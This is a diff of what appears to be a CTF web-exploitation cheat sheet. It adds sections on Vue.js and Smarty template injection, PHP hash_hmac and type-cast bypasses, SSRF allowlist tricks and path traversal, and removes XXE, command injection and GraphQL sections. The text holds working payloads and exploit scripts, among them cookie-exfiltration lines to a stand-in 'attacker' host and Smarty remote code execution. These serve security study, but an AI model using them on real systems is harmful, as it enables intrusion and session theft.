@@ -12,31 +12,24 @@
   - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
   - [Mako SSTI](#mako-ssti)
   - [Twig SSTI](#twig-ssti)
+  - [Vue.js Template Injection via toString.constructor (VolgaCTF 2018)](#vuejs-template-injection-via-tostringconstructor-volgactf-2018)
   - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
 - [SSRF](#ssrf)
   - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
-  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
+  - [DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)](#dns-rebinding-for-toctou-time-of-check-to-time-of-use)
   - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
-- [XXE (XML External Entity)](#xxe-xml-external-entity)
-  - [Basic XXE](#basic-xxe)
-  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
-  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
-- [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
-- [PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)](#php-variable-variables-var-abuse-bugs_bunny-2017)
-- [PHP uniqid() Predictable Filename (EKOPARTY 2017)](#php-uniqid-predictable-filename-ekoparty-2017)
-- [Sequential Regex Replacement Bypass (Tokyo Westerns 2017)](#sequential-regex-replacement-bypass-tokyo-westerns-2017)
-- [Command Injection](#command-injection)
-  - [Newline Bypass](#newline-bypass)
-  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
-  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
-  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
-  - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
-- [GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)](#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5)
-  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
-  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
-  - [String Interpolation Injection](#string-interpolation-injection)
+  - [Unescaped-Dot Regex Allowlist Bypass (Meepwn CTF Quals 2018)](#unescaped-dot-regex-allowlist-bypass-meepwn-ctf-quals-2018)
+  - [SNI-Based FTP Protocol Smuggling via HTTPS (PlaidCTF 2018)](#sni-based-ftp-protocol-smuggling-via-https-plaidctf-2018)
+  - [Apache mod_vhost_alias Docroot Override via Host Header (RCTF 2018)](#apache-mod_vhost_alias-docroot-override-via-host-header-rctf-2018)
+- [PHP hash_hmac Returns NULL with Array Input (AceBear 2018)](#php-hash_hmac-returns-null-with-array-input-acebear-2018)
+- [Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)](#smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018)
+- [Recursive-Replace Traversal `....//` (35C3 2018)](#recursive-replace-traversal--35c3-2018)
+- [PHP (int) Cast Leading-Number Traversal (35C3 2018)](#php-int-cast-leading-number-traversal-35c3-2018)
+- [strpos Substring-Match Blacklist Bypass (TUCTF 2018)](#strpos-substring-match-blacklist-bypass-tuctf-2018)
+- [User-Agent-Gated robots.txt (TAMUctf 2019)](#user-agent-gated-robotstxt-tamuctf-2019)
+- [PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)](#php-loginf-math-equality--recursive-urldecode-pragyan-ctf-2019)
 
-For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), see [server-side-exec.md](server-side-exec.md). For SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, and more, see [server-side-exec-2.md](server-side-exec-2.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
+For XXE, XML injection, PHP variable-variable abuse, uniqid/regex bypasses, command injection, and GraphQL exploitation, see [server-side-2.md](server-side-2.md). For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), see [server-side-exec.md](server-side-exec.md). For SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, and more, see [server-side-exec-2.md](server-side-exec-2.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).
 
 ---
 
@@ -259,6 +252,57 @@ ${__import__('os').popen('cat /flag.txt').read()}
 
 **Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.
 
+### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)
+
+**Pattern:** Vue.js client-side template injection using constructor chaining to execute JavaScript. When user input is rendered inside a Vue.js template (via `v-html`, server-side interpolation into Vue templates, or reflected into `{{ }}` delimiters), the template expression evaluator executes JavaScript.
+
+**Basic payloads:**
+```javascript
+// Constructor chaining to create and execute a Function object
+${toString.constructor('document.location="http://attacker/?"+document.cookie')()}
+
+// Alternative constructor chain
+{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}
+
+// Using the _c (createElement) internal to confirm Vue context
+{{_c.constructor('return 1')()}}
+```
+
+**Payload variations for different Vue versions:**
+```javascript
+// Vue 2.x — template expressions have access to the component scope
+{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}
+
+// Vue 2.x — via toString
+${toString.constructor('alert(document.domain)')()}
+
+// Vue 3.x — stricter sandbox, but constructor chaining still works
+{{(_=toString.constructor('return document'))().cookie}}
+```
+
+**Detection and exploitation:**
+```python
+import requests
+
+target = "http://target/page"
+
+# Step 1: Detect Vue.js template injection
+probes = [
+    "{{7*7}}",           # Returns 49 if expressions evaluated
+    "{{toString()}}",    # Returns [object Object] or similar
+    "${7*7}",            # Template literal syntax (some Vue configs)
+]
+for probe in probes:
+    r = requests.get(target, params={"name": probe})
+    print(f"Probe: {probe} -> {r.text[:200]}")
+
+# Step 2: Execute via constructor chain
+payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
+r = requests.get(target, params={"name": payload})
+```
+
+**Key insight:** Vue.js template expressions evaluate JavaScript. When user input is rendered in a Vue template, `toString.constructor(code)()` creates and executes a Function object, bypassing simple keyword filters. This works because JavaScript's `constructor` property on any object provides access to the `Function` constructor. Vue 2.x is more permissive; Vue 3.x has a stricter expression sandbox but constructor chaining often still works. Look for reflected input in pages that include Vue.js and use `{{ }}` or `v-bind` directives.
+
 ### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)
 
 **Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.
@@ -275,6 +319,101 @@ ${__import__('os').popen('cat /flag.txt').read()}
 3. The attribute change persists across requests in the session
 
 **Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).
+
+### Smarty SSTI via CVE-2017-1000480 Comment Injection (Insomni'hack 2018)
+
+**Pattern:** Smarty 3 < 3.1.32 with custom template resources places the template source file path inside a PHP comment (`/* ... */`) in compiled templates. If the path is user-controlled and `*/` is not sanitized, injecting `*/phpcode();/*` breaks out of the comment and executes arbitrary PHP.
+
+```text
+# Vulnerable URL pattern — template ID/path is user-controlled:
+http://target/?id=*/echo file_get_contents('/flag');/*
+
+# What happens server-side in the compiled template:
+# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
+# The injected */ closes the comment, PHP code executes, /* reopens a comment
+```
+
+```php
+// Smarty compiled template (simplified):
+// Before injection:
+<?php /* Smarty version x, compiled from "user_template_name" */ ?>
+
+// After injection with id = */echo file_get_contents('/flag');/*
+<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
+// Breaks down to:
+//   /* Smarty version x, compiled from "*/   ← comment ends here
+//   echo file_get_contents('/flag');          ← PHP executes
+//   /*" */                                    ← new comment
+```
+
+```python
+import requests
+
+# Basic file read
+r = requests.get("http://target/", params={
+    "id": "*/echo file_get_contents('/flag');/*"
+})
+print(r.text)
+
+# RCE
+r = requests.get("http://target/", params={
+    "id": "*/system('id');/*"
+})
+print(r.text)
+
+# If parentheses are filtered, use backtick execution:
+r = requests.get("http://target/", params={
+    "id": "*/echo `cat /flag`;/*"
+})
+```
+
+**Key insight:** Smarty places the template source path in a `/* ... */` PHP comment. If the path is user-controlled and `*/` is not sanitized, arbitrary PHP executes. This affects custom Smarty resources (where the template name comes from user input), not the default file-based resource handler. Fixed in Smarty 3.1.32. Look for Smarty template rendering where the template identifier is derived from URL parameters.
+
+---
+
+## PHP hash_hmac Returns NULL with Array Input (AceBear 2018)
+
+**Pattern:** PHP's `hash_hmac()` returns `NULL` (with a warning, not a fatal error) when the `$data` argument is an array instead of a string. Sending `nonce[]=x` via POST forces the parameter to be an array, making the HMAC output predictable since `hash_hmac('sha256', NULL, $secret)` is equivalent to `hash_hmac('sha256', '', $secret)` -- but more critically, when the `$key` argument receives `NULL` from a prior broken `hash_hmac`, all subsequent HMAC computations use an empty key.
+
+```php
+// Vulnerable server code:
+$nonce = $_POST['nonce'];
+$secret = file_get_contents('/secret_key');
+$mac = hash_hmac('sha256', $nonce, $secret);  // returns NULL if $nonce is array
+
+// Later: server uses $mac (NULL) as key for another HMAC
+$token = hash_hmac('sha256', 'gimmeflag', $mac);
+// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
+// This is a known constant the attacker can precompute!
+```
+
+```python
+import hmac
+import hashlib
+import requests
+
+# Precompute the token that the server will generate when mac=NULL
+# hash_hmac('sha256', 'gimmeflag', NULL) in PHP == HMAC with empty key in Python
+known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
+print(f"Predicted token: {known_token}")
+
+# Force nonce to be an array, breaking hash_hmac
+r = requests.post("http://target/getflag", data={
+    "nonce[]": "x",          # PHP receives $_POST['nonce'] as array ['x']
+    "token": known_token      # server-side comparison succeeds
+})
+print(r.text)
+```
+
+```text
+# HTTP request showing the array injection:
+POST /getflag HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+nonce[]=x&token=<precomputed_hmac>
+```
+
+**Key insight:** PHP silently coerces types, and `hash_hmac` with a non-string `$data` argument returns `NULL`/`false` instead of raising an error. Always check if parameters can be forced to arrays via `param[]=value`. This pattern extends to other PHP hash functions: `md5(array())` returns `NULL`, `sha1(array())` returns `NULL`. Any authentication flow chaining hash outputs as keys for subsequent operations is vulnerable when an intermediate hash can be forced to `NULL`.
 
 ---
 
@@ -311,7 +450,7 @@ response, err := http.Get("http://" + c.Request.Host + "/validate")
 
 ---
 
-### DNS Rebinding for TOCTOU
+### DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)
 ```python
 rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
 requests.post(f"{TARGET}/register", json={"url": rebind_url})
@@ -327,297 +466,164 @@ case CURLE_TOO_MANY_REDIRECTS:
     curl_easy_perform(curl);
 ```
 
----
+### Unescaped-Dot Regex Allowlist Bypass (Meepwn CTF Quals 2018)
 
-## XXE (XML External Entity)
+**Pattern:** SSRF target allowlist is enforced with a regex like `/^https?:\/\/meepwntube\.0x1337\.space$/`. The author forgot to escape the dots, so `.` matches any character. Register a domain whose literal name contains the right characters (`meepwntubex0x1337.space`) and point its A record at `127.0.0.1`.
 
-### Basic XXE
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>&xxe;</root>
-```
-
-### OOB XXE with External DTD
-Host evil.dtd:
-```xml
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
-%eval; %exfil;
-```
-
-### XXE via DOCX/Office XML Upload (School CTF 2016)
-
-DOCX files are ZIP archives containing XML. Modify `[Content_Types].xml` inside the DOCX to inject XXE payloads that execute when the server parses the uploaded document.
-
+**Exploit:**
 ```bash
-# Step 1: Create a minimal DOCX and extract it
-mkdir docx_exploit && cd docx_exploit
-unzip template.docx
-
-# Step 2: Inject XXE into [Content_Types].xml
-cat > '[Content_Types].xml' << 'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
-]>
-<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
-  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
-  <Default Extension="xml" ContentType="application/xml"/>
-  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
-  <Override PartName="/hack" ContentType="&xxe;"/>
-</Types>
-EOF
-
-# Step 3: Repackage as DOCX
-zip -r exploit.docx '[Content_Types].xml' word/ _rels/
-
-# Step 4: Upload to target
-curl -F "file=@exploit.docx" http://target/upload
-# Response or error message may contain base64-encoded file contents
+# Register meepwntubex0x1337.space, set A record → 127.0.0.1
+curl "https://target/fetch?url=http://meepwntubex0x1337.space/internal"
+# Regex: /meepwntube.0x1337.space$/ matches (each '.' matched as '.' OR 'x')
+# DNS resolves to 127.0.0.1 → SSRF to internal services
 ```
 
-**Key insight:** Any file format based on ZIP+XML (DOCX, XLSX, PPTX, ODT, SVG+ZIP) can carry XXE payloads. The parser often processes `[Content_Types].xml` first, making it the ideal injection point. Use `php://filter/convert.base64-encode` for binary-safe exfiltration.
+**Key insight:** Always escape `.` in URL allowlist regexes (`\.`) and anchor both ends (`^...$`). Unescaped dots turn a whitelist into a wildcard-prefix/suffix match — any attacker-controlled domain that fits the skeleton passes. Combine with a DNS record pointing to the loopback/internal range for direct SSRF.
 
----
+**References:** Meepwn CTF Quals 2018 — writeup 10441
 
-## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)
+### SNI-Based FTP Protocol Smuggling via HTTPS (PlaidCTF 2018)
 
-Application builds XML from HTTP headers (e.g., `X-Forwarded-For`) without sanitization. First-tag-wins XML parsing allows injecting arbitrary elements:
+**Pattern (idIoT: Camera):** A custom FTP server exposes an `IP` command used by the passive mode handshake. The only attacker primitive is a browser fetch (XSS). Browsers refuse to send custom FTP commands, but they do open HTTPS connections — and the TLS ClientHello contains the Server Name Indication (SNI) as plaintext. The FTP server ignores unknown commands and treats both `\n` and `\x00` as command terminators, so a carefully chosen hostname leaks FTP commands into its parser.
 
+**Exploit:**
+```text
+# Victim SNI hostname encodes the FTP command. The SNI length field
+# (2 bytes: 0x00 0x69) becomes 'i\n' when the first byte lines up with ASCII 'i'.
+# Subsequent payload bytes carry 'IP 240.1.2.3\n' terminators.
+
+https://ip8.8.8.8.aaaaaa...aaa.127.0.0.1.xip.io:1212/
+```
+1. Host `ip8.8.8.8....xip.io` resolves to the FTP server port.
+2. The browser sends a TLS ClientHello whose SNI bytes embed `IP 240.1.2.3\n`.
+3. The FTP server's line parser sees the SNI bytes as a new `IP` command, reassigning the passive-mode destination to the attacker.
+4. Subsequent `PASV` responses point the victim client at the attacker's IP, leaking the uploaded image.
+
+**Key insight:** Any plaintext framing inside an otherwise-encrypted protocol (SNI, HTTP Host header, ALPN) is a smuggling surface for servers that parse raw bytes. When victim browsers refuse to speak the target protocol directly, pick a protocol whose handshake echoes attacker-controlled bytes and tune the hostname so those bytes happen to form valid commands in the target parser.
+
+**References:** PlaidCTF 2018 — writeup 10018
+
+### Apache mod_vhost_alias Docroot Override via Host Header (RCTF 2018)
+
+**Pattern:** The server uses Apache's `mod_vhost_alias` with a wildcard document root such as `VirtualDocumentRoot /var/www/%0/`, so the directory served is derived at request time from the `Host` header. A PHP sandbox confines execution to `/var/www/sandbox/<token>/`, but because the docroot itself is taken from the header, setting `Host: ../../var/www/` (or any neighboring vhost) points the runtime outside the sandbox before PHP ever looks at the `open_basedir`.
+
+**Exploit:**
 ```http
-X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
+GET /shell.php HTTP/1.1
+Host: ../admin
 ```
+Apache resolves the docroot to `/var/www/admin`, so the request lands in a directory that was never intended to serve attacker code, bypassing the sandbox entirely.
 
-Produces: `<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>` -- the XML parser takes the first `<admin>true</admin>`, ignoring the legitimate `<admin>false</admin>` that follows.
+**Key insight:** When a multi-tenant Apache config computes the docroot from user-controlled inputs (`Host`, `X-Forwarded-Host`, cookies), every directory-based isolation mechanism downstream (PHP `open_basedir`, chroot helpers) depends on the inputs being sanitized *before* docroot resolution. Either pin the docroot via `ServerName`/`ServerAlias` or reject Host values containing `..`, `/`, or NULs at the Apache layer.
 
-**Key insight:** XML injection via HTTP headers when server builds XML from header values without escaping. First-match semantics exploit duplicate tags. Check any header that appears in server responses or logs as structured data (`X-Forwarded-For`, `User-Agent`, `Referer`).
+**References:** RCTF 2018 — writeup 10150
 
----
+## Recursive-Replace Traversal `....//` (35C3 2018)
 
-## PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)
-
-**Pattern:** PHP's variable variables (`$$key`) allow using a variable's value as the name of another variable. When a loop iterates over GET/POST parameters and assigns them as `$$key = $$value`, supplying `?_200=flag` captures `$flag`'s value into `$_200` before it gets overwritten.
-
-```php
-// Vulnerable pattern: loop that processes GET parameters as variable aliases
-foreach ($_GET as $key => $value) {
-    $$key = $$value;  // e.g., key="_200", value="flag" → $_200 = $flag
-}
-// Later: echo $_200;  // outputs the flag
-```
-
-```bash
-# Supply a "safe" output variable name as key, protected variable name as value
-curl "http://target/page.php?_200=flag"
-# PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
-```
-
-**How to find the output variable:** Look for variables beginning with HTTP status codes (e.g., `$_200`, `$_404`) in the source, or any variable echoed to output that starts with an underscore.
-
-**Key insight:** `$$key` creates arbitrary variable aliases; iterating GET/POST params with `$$key = $$value` lets an attacker redirect protected variables (like `$flag`) into any output variable they control by naming the output variable as the key and the secret variable as the value.
-
----
-
-## PHP uniqid() Predictable Filename (EKOPARTY 2017)
-
-**Pattern:** PHP's `uniqid()` uses `gettimeofday()` internally. The first 8 hex characters encode the Unix timestamp in seconds, making filenames predictable within a bounded time window.
-
-```php
-// Vulnerable: uses uniqid() to name an uploaded/generated file
-$filename = uniqid() . '_flag.txt';
-// e.g., "5a1b2c3d4e5f6_flag.txt" where first 8 chars = hex(unix_timestamp)
-```
-
-```python
-import requests
-import time
-
-# Know approximate upload time (from server Date header, challenge hint, etc.)
-start_ts = int(time.time()) - 60   # 60 second window before now
-end_ts   = int(time.time()) + 10
-
-for ts in range(start_ts, end_ts):
-    hex_prefix = format(ts, '08x')
-    url = f'http://target/uploads/{hex_prefix}_flag.txt'
-    r = requests.get(url)
-    if r.status_code == 200:
-        print(f"Found: {url}")
-        print(r.text)
-        break
-```
-
-**Narrowing the window:** The server's `Date` response header tells you the server's current time. Record it when triggering file creation; the timestamp in the filename will match that second.
-
-**Key insight:** PHP `uniqid()` first 8 hex chars = Unix timestamp in seconds. The file is fully predictable within a known time window — brute-force is O(seconds in window), typically under 100 requests.
-
----
-
-## Sequential Regex Replacement Bypass (Tokyo Westerns 2017)
-
-**Pattern:** When a sanitizer applies regex replacements sequentially (not simultaneously), the first replacement can produce a substring that the second replacement should catch — but since the second replacement already ran (or the first runs after the second), the dangerous pattern survives.
-
-```php
-// Vulnerable: replacements run in sequence on the same string
-$input = preg_replace('/on\w+=\S+/', '', $input);   // pass 1: strip event handlers
-$input = preg_replace('/<script[^>]*>/', '', $input); // pass 2: strip script tags
-```
+**Pattern:** Filter strips `../` with a single `str_replace('../', '', $path)` pass. The payload `....//` contains `../` exactly once in the middle — after removal, the surrounding characters collapse into `../`.
 
 ```text
-# Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
-# Input: <scr<script>ipt>
-# Pass 2 strips inner <script> → leaves: <script>
-# The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
+Accept-Language: ....//....//....//....//flag
+            →    ../ ../ ../ ../flag
 ```
 
-```bash
-# Practical bypass — embed the dangerous string inside the blocked string:
-# If filter strips "script" then strips "on.*=":
-curl "http://target/" --data 'input=<img sron=c onerror=alert(1)>'
-# Pass 1 strips "onerror=" leaving  <img src onerror=alert(1)> with partial strip
-# Exact bypass depends on regex — test with variations like:
-# <scr\x00ipt>, <scr ipt>, embed keyword inside itself
-```
+**Key insight:** Non-recursive filters that remove substrings once leave their residue interleaved in a way that re-forms the target. `....//` is for `../`; `....\\\\` is for `..\`. Use until the filter iterates to a fixed point.
 
-**Key insight:** Sequential regex replacements let pass N reconstruct what pass M already checked. The first replacement produces a pattern the second was designed to catch, but because the second has already run (or the first runs last), the reconstructed dangerous pattern passes through. Always apply sanitization in a single idempotent pass or use a parser-based sanitizer.
+**References:** 35C3 CTF 2018 — flags, writeup 12831
 
 ---
 
-## Command Injection
+## PHP (int) Cast Leading-Number Traversal (35C3 2018)
 
-### Newline Bypass
-```bash
-curl -X POST http://target/ --data-urlencode "target=127.0.0.1
-cat flag.txt"
-curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
-```
-
-### Incomplete Blocklist Bypass
-When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
-Common missed: `;` semicolons, backticks, `$()` substitution
-
-### Sendmail Parameter Injection via CGI (SECCON 2015)
-
-When CGI scripts pass user input to `sendmail` via `open()` pipe:
-
-```perl
-open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
-```
-
-Inject shell commands by breaking out of the quoted context:
-
-```bash
-mail=' -bp|ls SECRETS #
-mail=' -bp|cat SECRETS/backdoor123.php #
-```
-
-The `-bp` flag forces sendmail into queue-print mode (non-interactive), and `|` pipes to shell. Discovery chain: find `.cgi_bak` backup files to read source → identify injection point → execute commands.
-
-### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)
-
-When a service processes images containing barcodes (via zbar/zxing), multiple barcodes in one image get concatenated into a single string. Exploit by combining a valid barcode with a malicious Code128 barcode:
-
-1. **Create valid barcode:** Generate UPC/EAN-13 barcode that passes type validation
-2. **Create injection barcode:** Generate Code128 barcode containing shell metacharacters:
-   ```text
-   test", "node": "hi'; cat /flag > /tmp/out; #
-   ```
-3. **Combine into single image:** `montage valid.png malicious.png -tile 2x1 combined.png`
-4. **Upload:** Scanner reads both barcodes, concatenates values, and passes to a system() call or JSON parser
-
-```bash
-# Generate Code128 barcode with injection payload
-python3 -c "
-import barcode
-from barcode.writer import ImageWriter
-code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
-code.save('inject')
-"
-# Combine with valid UPC barcode
-montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
-```
-
-**Key insight:** Barcode libraries process ALL detected barcodes in an image. Type validation (e.g., "must be UPC") may only check the first barcode, while concatenated output from all barcodes flows into downstream processing. This is analogous to HTTP parameter pollution but for visual data.
-
-### Git CLI Newline Injection via URL Path (BSidesSF 2026)
-
-**Pattern (gitfab):** A web-based repository viewer shells out to git CLI using backticks: `` `git show "#{path}"` ``. The application sanitizes shell metacharacters (`<`, `>`, `|`, `;`, `&`) but allows newlines. URL-encoded newline (`%0a`) in the path parameter breaks out of the git command and injects arbitrary shell commands.
+**Pattern:** Validation casts the parameter to `(int)` and compares against a blacklist, but the raw string is later concatenated into a filesystem path. `(int) "-4133353959107185265/../../admin"` returns `-4133353959107185265`, so the numeric check passes while the raw value carries a path traversal.
 
 ```text
-GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
+id=-4133353959107185265/../../admin
 ```
 
-Decoded, this becomes:
+**Key insight:** Any validator that *casts* instead of *parses* only sees the leading numeric prefix. Always compare the original input against a strict regex (`^-?\d+$`) when the same string is reused downstream.
+
+**References:** 35C3 CTF 2018 — Not(e) accessible, writeup 12879
+
+---
+
+## strpos Substring-Match Blacklist Bypass (TUCTF 2018)
+
+**Pattern:** PHP blocks LFI targets with `if (strpos($file, '/etc/passwd') == true) die();`. `strpos` returns the *position* of the substring (or `false`), so the filter only blocks paths that contain the literal string. Any traversal that ends in a different file passes the check.
+
+```php
+# Bypass: file=../../TheEgg.html — strpos returns false, include proceeds
+```
+
+Also: `strpos(...) == true` (loose comparison) is true for any non-zero offset; the subtle version of this bug blocks substring matches at offset `>=1` but allows substring matches at offset `0`.
+
+**Key insight:** `strpos()`, `str_contains()`, and `preg_match()` are identification checks, not validation. For filename/path safety, resolve the full path with `realpath()` and compare against an allowlisted root.
+
+**References:** TUCTF 2018 — Easter Egg: Crystal Gate, writeup 12380
+
+---
+
+## User-Agent-Gated robots.txt (TAMUctf 2019)
+
+**Pattern:** `/robots.txt` serves different bodies depending on the `User-Agent`. Humans (default UAs) see a decoy file; crawler UAs such as `Googlebot/2.1` see the real `Disallow:` list — which is where the challenge hides paths.
+
 ```bash
-git show "test"
-cat /home/ctf/flag.txt
-echo ""
+# Decoy
+curl -s http://target/robots.txt
+# "WHAT IS UP, MY FELLOW HUMAN! ..."
+
+# Real file
+curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
+     http://target/robots.txt
+# User-agent: Googlebot
+# Disallow: /super-secret-admin-panel/
+# Disallow: /flag-is-here.txt
 ```
 
-```ruby
-require 'httparty'
+Always rotate through common crawler UAs when recon reveals a themed robots.txt decoy:
 
-# URL-encode newline injection
-path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
-response = HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
-puts response.body
+```bash
+for UA in \
+  'Googlebot/2.1' \
+  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' \
+  'Mozilla/5.0 (compatible; YandexBot/3.0)' \
+  'facebookexternalhit/1.1' \
+  'Slackbot-LinkExpanding 1.0' \
+  'Twitterbot/1.0'; do
+  echo "=== $UA ==="
+  curl -s -A "$UA" http://target/robots.txt
+done
 ```
 
-**Key insight:** Newline (`\n`, `%0a`) is frequently overlooked in command injection filters. While `;`, `|`, and `&` are commonly blocked, newline acts as a command separator in shell and is valid in URLs. Any application that passes URL path components to shell commands via string interpolation (backticks, `system()`, `popen()`) is vulnerable if newlines aren't filtered.
+**Key insight:** Bot-specific content negotiation on `robots.txt` (and `sitemap.xml`, `/.well-known/*`, home pages) can disclose paths normally hidden from human browsers. Always test with `User-Agent: Googlebot/2.1` and the other major crawler signatures — the same bypass also works on paywalls that allow bots to index content and on WAFs that allowlist crawlers by UA alone.
 
-**When to recognize:** Web app interacts with git, svn, or other CLI tools. Source shows shell interpolation with partial sanitization. Test with `%0a` (newline) and `%0d%0a` (CRLF) in URL parameters.
-
-**Defense check:** Does the filter block `\n` (0x0a)? Does it use allowlists instead of blocklists? Does it use `execve()` (no shell) instead of `system()` (shell)?
+**References:** TAMUctf 2019 — Robots Rule, writeup 13707
 
 ---
 
-## GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)
+## PHP log()/INF Math Equality + Recursive urldecode() (Pragyan CTF 2019)
 
-### Introspection and Schema Discovery
+**Pattern 1 — INF == INF:** PHP's `log()`/`log10()` of a huge float returns `INF`, and `INF == INF` is true. A gate like
+```php
+$a = hash('sha256', $a);              // 64 hex chars, e.g. "a..." -> string
+$a = (log10($a ** 0.5)) ** 2;         // "a..." ** 0.5 -> INF, log10(INF) -> INF, **2 -> INF
+if ($c > 0 && $d > 0 && $d > $c && $a == $c*$c + $d*$d) { /* pass */ }
+```
+passes whenever `$c*$c + $d*$d` is also INF. `7e1000` (over `DBL_MAX`) is `INF` in PHP, so `val3=1&val4=7E1000` satisfies the `$d > $c` ordering with both sides INF.
 
-```graphql
-# Full schema enumeration (often left enabled in CTFs)
-{__schema{types{name,fields{name,args{name,type{name}}}}}}
-
-# Shortened introspection query
-{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}
-
-# Find all mutations
-{__schema{mutationType{fields{name,args{name,type{name}}}}}}
-
-# Find hidden types
-{__schema{types{name,kind,description}}}
+**Pattern 2 — Recursive urldecode loop:** A loop requires `$b != urldecode($b)` ten times and the final value to equal `"WoAHh!"`. `%25` decodes to `%`, so each pass peels one layer: encode the first character nine times.
+```
+WoAHh! -> %57oAHh! -> %2557oAHh! -> ... (10 layers) -> %2525252525252525252557oAHh!
 ```
 
-### Query Batching and Aliasing for Rate Limit Bypass
-
-```graphql
-# Execute same mutation N times in single request via aliases
-mutation {
-  a1: increaseVote(id: "target") { count }
-  a2: increaseVote(id: "target") { count }
-  a3: increaseVote(id: "target") { count }
